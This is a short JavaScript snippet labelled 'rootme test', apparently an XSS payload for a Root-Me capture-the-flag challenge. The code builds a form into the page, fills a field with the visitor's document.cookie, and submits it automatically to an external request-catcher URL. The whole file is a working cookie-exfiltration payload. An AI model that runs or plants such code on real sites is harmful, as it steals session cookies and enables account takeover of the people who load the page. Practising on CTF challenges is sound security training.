// rootme test

const r = document.getElementById('result');

r.innerHTML = `
<form id="form" action="https://zpiboo.requestcatcher.com/rootme" method="POST">
  <input name="cookies" value="${document.cookie.replace('"','\\"')}">
  <input type="submit">
</form>
`;

const attackForm = document.getElementById('form');
attackForm.submit();
